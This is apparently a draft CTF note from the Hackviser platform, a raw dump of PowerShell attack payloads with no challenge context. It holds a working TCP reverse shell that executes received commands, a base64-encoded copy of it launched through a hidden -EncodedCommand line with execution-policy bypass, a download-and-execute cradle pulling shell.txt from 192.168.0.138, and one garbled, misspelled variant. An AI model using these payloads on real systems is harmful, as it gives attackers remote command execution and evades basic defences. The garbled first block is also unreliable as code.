---
# Imported from Obsidian: CTF/hackviser/Pwn22Pwn.md
# Draft: raw payload dump, no challenge context or flag
title: Pwn22Pwn
category: Web
ctf: Hackviser
date: 2026-08-07
tags:
- hackviser
- web
lang: fr
draft: true
imported: true
---

```
==powershell -nop -W hidden -oni -ep bypass -c== =="== ==$TCPClient== ==$NetworkStream== ==$TCPClient===== $TCPClient.GetStream(== ==$StreamWriter====$StreamWriter = New-Object IO.StreamWriter(====$NetworkStream====);function WriteToStream== ==$script====(====$Streing====]====$TCPClient====$StreamWriter.====Write(====$String== ==+ 'SHELL> ');== ==$StreamWriter====$StreamWriter.Flush()}WriteToStream '';while((====$BytesRead== ===== ==$NetworkStream====.Read(====$Buffer====, 0,== ==$Buffer.====Longth)) -gt 0====$Command====)== ==$Buffer====, 0,== ==$BytesRead== ==- 1);== ==$Output== === try {Invoke-Expression== ==$Command== ==2>&1 | Out-String} catch {====$_== ==| Out-String}WriteStream (====$Output====)}====$StreamWriter====()"==
```

```
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
$sendbyte = ([text.encoding]::ASCII).GetBytes("Windows PowerShell `nCopyright (C) Microsoft Corporation. All rights reserved.`n`nPS " + (Get-Location).Path + "> ");
$stream.Write($sendbyte,0,$sendbyte.Length);

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (Get-Location).Path + "> ";
    $x = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($x,0,$x.Length);
    $stream.Flush();
}
$client.Close();
```

```
JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTkyLjE2OC4wLjEzOCIsMTkwNCk7CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwpbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07CiRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygiV2luZG93cyBQb3dlclNoZWxsIGBuQ29weXJpZ2h0IChDKSBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gblBTICIgKyAoR2V0LUxvY2F0aW9uKS5QYXRoICsgIj4gIik7CiRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7Cgp3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApCnsKICAgICRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgJHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOwogICAgJHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChHZXQtTG9jYXRpb24pLlBhdGggKyAiPiAiOwogICAgJHggPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7CiAgICAkc3RyZWFtLldyaXRlKCR4LDAsJHguTGVuZ3RoKTsKICAgICRzdHJlYW0uRmx1c2goKTsKfQokY2xpZW50LkNsb3NlKCk7
```

```
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTkyLjE2OC4wLjEzOCIsMTkwNCk7CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwpbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07CiRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygiV2luZG93cyBQb3dlclNoZWxsIGBuQ29weXJpZ2h0IChDKSBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gblBTICIgKyAoR2V0LUxvY2F0aW9uKS5QYXRoICsgIj4gIik7CiRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7Cgp3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApCnsKICAgICRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgJHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOwogICAgJHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChHZXQtTG9jYXRpb24pLlBhdGggKyAiPiAiOwogICAgJHggPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7CiAgICAkc3RyZWFtLldyaXRlKCR4LDAsJHguTGVuZ3RoKTsKICAgICRzdHJlYW0uRmx1c2goKTsKfQokY2xpZW50LkNsb3NlKCk7
```

```
`powershell.exe -nop -W hidden -noni -ep bypass -c "$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.0.138:8089/shell.txt'); IEX $code"`
```
